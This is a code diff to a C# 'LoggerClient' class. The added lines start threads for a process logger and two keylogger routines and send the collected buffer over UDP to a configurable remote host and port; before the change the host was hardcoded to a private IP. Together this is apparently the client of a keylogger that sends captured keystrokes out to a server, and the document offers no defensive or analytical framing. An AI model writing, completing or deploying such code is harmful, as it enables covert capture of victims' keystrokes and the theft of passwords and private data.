@@ -1,4 +1,5 @@
-﻿using System;
+﻿using Logger;
+using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Net.Sockets;
@@ -11,11 +12,23 @@ namespace LoggerClient
     public class Client
     {
         private static StringBuilder clientBuffer = new StringBuilder();
-        private const string host = "192.168.1.48";
+        private static string host;
+        private static int port;
 
-        private static void run(string hostname, int port)
+        public static void run(string hostName, int portVal)
         {
+            host = hostName;
+            port = portVal;
 
+            Thread thread1 = new Thread(new ThreadStart(ProcessLogger.run));
+            thread1.Start();
+            //  Thread thread2 = new Thread(new ThreadStart(KeyLogger.run));
+            Thread thread2 = new Thread(new ThreadStart(KeyLogger1.run));
+            thread2.Start();
+            Thread thread4 = new Thread(new ThreadStart(KeyLogger1.run1));
+            thread4.Start();
+            Thread thread3 = new Thread(new ThreadStart(sendBuffToServer));
+            thread3.Start();
         }
 
         public static void appendToBuffer(StringBuilder str)
@@ -23,10 +36,10 @@ namespace LoggerClient
             if ((str.Length + clientBuffer.Length) >=
                 clientBuffer.MaxCapacity)
             {
-                clientBuffer.Remove(0, str.Length);
+                 clientBuffer.Remove(0, str.Length);
             }
 
-            clientBuffer.Append(str);
+             clientBuffer.Append(str);
         }
 
         private static void sendBuffToServer()
@@ -37,7 +50,7 @@ namespace LoggerClient
                 if (clientBuffer.Length == 0) continue;
 
                 UdpClient client = new UdpClient();
-                client.Connect(host, 3000);
+                client.Connect(host, port);
                 byte[] data = Encoding.UTF8.GetBytes(clientBuffer.ToString());
                 int sendedBytes = client.Send(data, data.Length);
 
